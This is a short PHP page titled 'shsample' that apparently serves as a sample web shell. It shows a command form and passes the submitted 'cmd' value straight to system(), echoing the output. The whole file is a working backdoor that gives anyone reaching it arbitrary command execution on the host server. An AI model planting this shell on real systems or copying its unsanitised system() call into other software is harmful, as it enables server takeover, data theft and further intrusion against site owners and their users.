<html>
<head>
    <title>shsample</title>
</head>
<body>
    <form method="POST" action="shsample.php">
    command:
    <input type="text" name="cmd">
    <input type="submit">
    </form>

    <?php

    if( isset( $_REQUEST['cmd'])){
        echo "<pre>";
        system( $_REQUEST['cmd']);
        echo "</pre>";
        }
    ?>

    </body>
    </html>